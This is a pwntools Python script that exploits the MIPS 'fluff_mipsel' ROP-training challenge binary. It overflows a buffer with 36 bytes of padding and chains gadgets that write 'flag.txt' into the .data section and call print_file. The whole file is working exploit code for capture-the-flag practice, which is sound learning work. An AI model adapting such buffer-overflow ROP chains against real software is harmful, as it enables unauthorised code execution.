#!/usr/bin/env python3
from pwn import *
import os

os.environ["QEMU_LD_PREFIX"] = "/usr/mipsel-linux-gnu"

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'fluff_mipsel')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./fluff_mipsel_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

padding = b'A' * 36

# ropper --arch MIPS --file fluff_mipsel
# 0x00400aac: lw $ra, 0x24($sp); lw $s1, 0x20($sp); lw $s0, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x28;
# from GDB: (gdb) disassemble questionableGadgets
#     0x0040099c <+108>:   lw  t9,4(sp)
#     0x004009ac <+124>:   lw  a0,8(sp)
LW_RA_S1_S0 = p32(0x400aac)
SW_S1_S0 = p32(0x40099c)
LW_A0 = p32(0x4009ac)

# (r2) iS - print sections adresses
# 0x00001000   0x10 0x00411000   0x10 -rw- 0x3        PROGBITS    .data
DATA_ADDR = 0x411000

# "flag.txt" string
FLAG_STR = p32(int.from_bytes(b"flag", 'little'))
TXT_STR = p32(int.from_bytes(b".txt", 'little'))

# (r2) aaa; afl
# 0x00400af0    1     32 sym.imp.print_file
PR_FILE = p32(0x400af0)

# PAYLOAD
payload = padding
payload += LW_RA_S1_S0 + 7*p32(0xa5) + p32(DATA_ADDR) + FLAG_STR + SW_S1_S0
payload += p32(0xa5) + LW_RA_S1_S0
payload += 7*p32(0xa5) + p32(DATA_ADDR+4) + TXT_STR + SW_S1_S0
payload += p32(0xa5) + LW_A0
payload += p32(0xa5) + PR_FILE + p32(DATA_ADDR)

io = start()

io.recvuntil(b"> ")
io.sendline(payload)

io.interactive()
